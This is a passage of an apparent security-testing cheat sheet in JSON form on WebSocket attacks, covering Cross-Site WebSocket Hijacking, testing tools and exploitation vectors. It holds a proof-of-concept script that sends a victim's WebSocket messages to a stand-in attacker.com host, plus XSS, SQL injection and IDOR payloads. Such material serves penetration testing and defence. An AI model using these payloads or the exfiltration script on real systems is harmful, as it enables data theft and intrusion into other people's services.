    "sections": [
        {
            "type": "hint",
            "variant": "info",
            "content": "WebSockets provide bi-directional, full-duplex communication over a single TCP connection. They are commonly used for real-time features like chat, notifications, and live updates, but often lack the traditional security controls found in standard HTTP APIs."
        },
        {
            "heading": "Protocol Handshake",
            "type": "code_block",
            "content": [
                "# Handshake Request",
                "GET /chat HTTP/1.1",
                "Host: normal-website.com",
                "Sec-WebSocket-Version: 13",
                "Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==",
                "Connection: keep-alive, Upgrade",
                "Upgrade: websocket",
                "Origin: https://normal-website.com",
                "",
                "# Handshake Response",
                "HTTP/1.1 101 Switching Protocols",
                "Connection: Upgrade",
                "Upgrade: websocket",
                "Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk="
            ]
        },
        {
            "heading": "Security Testing & CSWSH",
            "type": "code_block",
            "content": [
                "# Cross-Site WebSocket Hijacking (CSWSH)",
                "# Occurs when the server fails to validate the 'Origin' header.",
                "",
                "# 1. Test for Vulnerability (Curl)",
                "curl -i -N -H \"Connection: Upgrade\" \\",
                "  -H \"Upgrade: websocket\" \\",
                "  -H \"Host: target.com\" \\",
                "  -H \"Origin: https://attacker.com\" \\",
                "  -H \"Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==\" \\",
                "  -H \"Sec-WebSocket-Version: 13\" \\",
                "  https://target.com/socket",
                "# Success = 101 Switching Protocols",
                "",
                "# 2. Attacker JS PoC",
                "<script>",
                "  var ws = new WebSocket('wss://vulnerable-site.com/chat');",
                "  ws.onopen = () => ws.send('{\"action\": \"get_messages\"}');",
                "  ws.onmessage = (e) => fetch('https://attacker.com/log?d=' + encodeURIComponent(e.data));",
                "</script>",
                "",
                "# 3. Message Manipulation (Console)",
                "const originalSend = WebSocket.prototype.send;",
                "WebSocket.prototype.send = function(data) {",
                "    console.log('Intercepted:', data);",
                "    return originalSend.call(this, data);",
                "};"
            ]
        },
        {
            "heading": "Vulnerability Checklist",
            "type": "code_block",
            "content": [
                "- Origin Validation: Check if server accepts cross-origin handshake.",
                "- Authentication: Try connecting without session cookies.",
                "- Injection: Fuzz messages with XSS/SQLi/Command Injection payloads.",
                "- IDOR: Check for predictable user/message IDs in JSON payloads.",
                "- Rate Limiting: Test for lack of per-connection message limits.",
                "- Insecure ws://: Verify if plain WebSocket is accepted over HTTP."
            ]
        },
        {
            "heading": "Testing Tools",
            "type": "code_block",
            "content": [
                "# STEWS - Security Testing for WebSockets",
                "python3 stews.py -u wss://target.com/socket --discovery",
                "python3 stews.py -u wss://target.com/socket --fuzz",
                "",
                "# wscat (CLI Client)",
                "wscat -c wss://target.com/socket -H \"Cookie: session=abc123\"",
                "",
                "# websocat",
                "websocat -H \"Origin: https://attacker.com\" wss://target.com/socket",
                "",
                "# Burp Suite",
                "1. Proxy -> WebSockets history",
                "2. Send to Repeater for manual modification",
                "3. Use Intruder for payload fuzzing"
            ]
        },
        {
            "heading": "Exploitation Vectors",
            "type": "code_block",
            "content": [
                "# XSS via WebSocket",
                "ws.send('{\"message\": \"<img src=x onerror=alert(1)>\"}');",
                "",
                "# SQL Injection via WebSocket",
                "ws.send('{\"user_id\": \"1 OR 1=1--\"}');",
                "ws.send('{\"search\": \"test\\' UNION SELECT password FROM users--\"}');",
                "",
                "# Authorization Bypass / IDOR",
                "ws.send('{\"action\": \"get_messages\", \"user_id\": \"admin\"}');",
                "ws.send('{\"action\": \"delete\", \"message_id\": \"1\", \"user_id\": \"victim\"}');"
            ]
        },
